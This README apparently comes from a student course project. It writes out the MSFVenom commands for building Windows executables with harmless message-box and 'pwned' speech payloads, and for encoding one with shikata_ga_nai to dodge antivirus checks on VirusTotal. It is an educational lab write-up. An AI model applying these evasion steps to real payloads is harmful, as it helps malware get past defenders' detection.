# DIY-Malware

## Overview
This project, part of the CYB101 course, dives into the world of malware creation using **MSFVenom**. The goal of this project was to create several malware files with various payloads and test their detectability using tools such as **VirusTotal**. This project emphasizes how malware is constructed and how basic antivirus measures can be bypassed using encrypted payloads. 

## Project Goals
By completing this project, I was able to:
- Use **MSFVenom** to create multiple virus files.
- Understand how to bundle multiple payloads into a single virus.
- Apply encryption techniques to create an obfuscated payload that might evade detection.
- Analyze how viruses are detected by antiviruses and malware scanners such as VirusTotal.

## Tools Used
- **MSFVenom**: A tool from the Metasploit Framework for generating custom malware.
- **VirusTotal**: A free service that analyzes files for viruses using multiple antivirus engines.

## Project Instructions

### Step 1: Create a Simple Message Virus
In this step, I created a simple virus file using **MSFVenom** that displays a message box when executed. Hereâ€™s the command used:
```bash
msfvenom -a x86 --platform windows -p windows/messagebox TEXT="Virus Executed" -f exe -o messageVirus.exe
```
The resulting virus file `messageVirus.exe` will show a message box with the text "Virus Executed" when executed.

### Step 2: Create a Multi-Payload Virus
Next, I created a more advanced virus that contains multiple payloads. The first payload displays a message, and the second payload uses the **speak_pwned** functionality, which makes the system speak the word "pwned."
```bash
msfvenom -a x86 --platform windows -p windows/messagebox TEXT="Virus Executed" -f raw > messageBox
msfvenom -c messageBox -a x86 --platform windows -p windows/speak_pwned -f exe -o pwnedVirus.exe
```
This generated the `pwnedVirus.exe`, which contains both a message box and audio notification payloads.

### Step 3: Create an Encrypted Virus
For the final step, I created an encrypted payload to test if it could bypass antivirus detection. Using the **shikata_ga_nai** encoder, I wrapped the payload in an encryption loop to obscure its behavior.
```bash
msfvenom -a x86 --platform windows -p windows/messagebox TEXT="Encrypted Virus" -e x86/shikata_ga_nai -i 3 -f python -o messageEncrypted.py
```
Then, I bundled this encrypted payload into a final virus file:
```bash
msfvenom -c messageEncrypted.py -a x86 --platform windows -p windows/speak_pwned -f exe -o pyVirus.exe
```
The `pyVirus.exe` file was designed to evade basic antivirus detection.

## Results
The three malware files I created are:
1. **messageVirus.exe**: A simple message virus.
2. **pwnedVirus.exe**: A multi-payload virus with a message and speak payload.
3. **pyVirus.exe**: An encrypted virus that attempts to bypass detection.

## VirusTotal Analysis
After creating the malware files, I uploaded them to **VirusTotal** to see if they would be detected by antivirus engines. The results varied, with the encrypted virus having a better chance of evading detection than the others.
